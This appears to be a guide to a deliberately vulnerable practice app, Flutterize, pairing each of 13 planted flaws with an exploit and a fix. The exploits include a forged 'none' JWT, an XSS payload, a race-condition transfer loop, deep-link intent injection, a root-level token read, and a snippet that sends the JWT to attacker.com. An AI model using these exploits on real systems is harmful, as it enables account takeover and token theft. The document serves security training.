# Flutterize — Vulnerability Guide

This application contains **13 intentional security vulnerabilities** for cybersecurity learning.

## Quick Start

```bash
make vulnerable    # Enable all backend vulnerabilities
make secure        # Revert to secure code
```

---

## Backend Vulnerabilities

### 1. JWT `none` Algorithm Bypass (A07)

**Difficulty:** 🟢 Easy

**Exploit:** Forge a JWT with `"alg":"none"` and no signature:

```bash
# Create forged token (header.payload with no signature)
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"user_id":1,"email":"admin@flutterize.lab","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
TOKEN="${HEADER}.${PAYLOAD}."

curl http://localhost:8443/api/profile -H "Authorization: Bearer $TOKEN"
```

**Fix:** Validate `t.Method.(*jwt.SigningMethodHMAC)` in middleware.

---

### 2. IDOR — View Any User's Profile (A01)

**Difficulty:** 🟢 Easy

**Exploit:** Add `?id=` to see other users:

```bash
curl http://localhost:8443/api/profile?id=2 \
  -H "Authorization: Bearer $YOUR_TOKEN"
```

**Fix:** Always use JWT `user_id`, never accept user-supplied ID.

---

### 3. Negative Amount Transfer (A04)

**Difficulty:** 🟢 Easy

**Exploit:** Transfer negative points to steal from the receiver:

```bash
curl -X POST http://localhost:8443/api/points/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"receiver_identifier":"user@flutterize.lab","amount":-500,"note":"steal"}'
```

**Fix:** Validate `amount > 0` before processing.

---

### 4. Mass Assignment — Register with Custom Points (A08)

**Difficulty:** 🟡 Medium

**Exploit:** Include `points_balance` in register body:

```bash
curl -X POST http://localhost:8443/api/register \
  -d '{"email":"rich@evil.com","phone":"0899","fullname":"Rich","birthdate":"2000-01-01","password":"pass123","points_balance":999999}'
```

**Fix:** Ignore `points_balance` in request body, hardcode to 0.

---

### 5. User Enumeration (A07)

**Difficulty:** 🟢 Easy

**Exploit:** Different error messages reveal which accounts exist:

```bash
# Returns "email already registered" if account exists
curl -X POST http://localhost:8443/api/register \
  -d '{"email":"admin@flutterize.lab","phone":"0","fullname":"x","birthdate":"2000-01-01","password":"x"}'
```

**Fix:** Return generic "registration failed" for all conflicts.

---

### 6. Reset Token Leaked in Response (A04)

**Difficulty:** 🟡 Medium

**Exploit:** The forgot-password response contains the reset token:

```bash
curl -X POST http://localhost:8443/api/forgot-password \
  -d '{"identifier":"admin@flutterize.lab"}'
# Response includes "debug_token": "abc123..."

curl -X POST http://localhost:8443/api/reset-password \
  -d '{"token":"abc123...","new_password":"hacked"}'
```

**Fix:** Only send token via email/SMS, never in API response.

---

### 7. Stored XSS via Fullname (A03)

**Difficulty:** 🟡 Medium

**Exploit:** Register with XSS in fullname, view in MockMail UI:

```bash
curl -X POST http://localhost:8443/api/register \
  -d '{"email":"xss@evil.com","phone":"077","fullname":"<script>alert(document.cookie)</script>","birthdate":"2000-01-01","password":"x"}'

# Trigger forgot-password for this account, then view MockMail at :8025
```

**Fix:** Sanitize HTML tags in user input.

---

### 10. Race Condition — Double Spend (A04)

**Difficulty:** 🔴 Hard

**Exploit:** Send concurrent transfer requests:

```bash
TOKEN="your_jwt_token"
for i in $(seq 1 50); do
  curl -s -X POST http://localhost:8443/api/points/transfer \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"receiver_identifier":"user@flutterize.lab","amount":1000,"note":"race"}' &
done
wait

# Check balance — should be deeply negative
curl http://localhost:8443/api/points/balance -H "Authorization: Bearer $TOKEN"
```

**Fix:** Use `SELECT ... FOR UPDATE` row lock inside DB transaction.

---

## Android Client Vulnerabilities

### 8. SSL Pinning Bypass (A07) — Toggleable

**Difficulty:** 🔴 Hard

**Exploit:** In vulnerable mode, the app has `badCertificateCallback = true`. Intercept with Burp Suite:

1. Configure Burp proxy on Android emulator
2. Traffic is interceptable despite SSL pinning setup
3. Practice with Frida script for proper cert pinning bypass

**Fix (applied in secure mode):** Remove `badCertificateCallback` — only the bundled rootCA is trusted.

---

### 9. Root Detection Bypass (M8) — Toggleable

**Difficulty:** 🔴 Hard

The app blocks rooted/emulated devices in secure mode. In vulnerable mode, the check is disabled.
When secure mode is active, practice bypassing with:

- **Frida:** `frida -U -f lab.flutterize.flutterize -l bypass.js`
- **APK Patching:** Decompile with apktool, patch smali, repackage
- **Magisk Hide / Zygisk:** Hide root from the app

---

### 11. Deep Link Intent Injection (M1)

**Difficulty:** 🟡 Medium

**Exploit via ADB:**

```bash
# Transfer points without user interaction
adb shell am start -a android.intent.action.VIEW \
  -d "flutterize://action/transfer?to=attacker@evil.com&amount=9999"

# Reset password without user interaction
adb shell am start -a android.intent.action.VIEW \
  -d "flutterize://action/reset?token=TOKEN_HERE&new_password=hacked"
```

**Fix:** Remove deep link handler, or require re-authentication for sensitive actions.

---

### 12. WebView JavaScript Bridge (M1)

**Difficulty:** 🔴 Hard

**Exploit:** The Help page has a debug console exposing the JWT token.
In a real WebView scenario, MITM the HTTP-loaded help page and inject:

```javascript
let token = window.FlutterizeApp.postMessage('getToken');
fetch('https://attacker.com/steal?token=' + token);
```

**Fix:** Remove JS bridge, load WebView content over HTTPS with cert pinning.

---

### 13. Insecure Local Storage (M9)

**Difficulty:** 🟢 Easy

**Exploit on rooted device:**

```bash
adb shell su -c "cat /data/data/lab.flutterize.flutterize/shared_prefs/FlutterSharedPreferences.xml"
# Extracts JWT token in plaintext
```

**Fix:** Use `flutter_secure_storage` backed by Android Keystore.
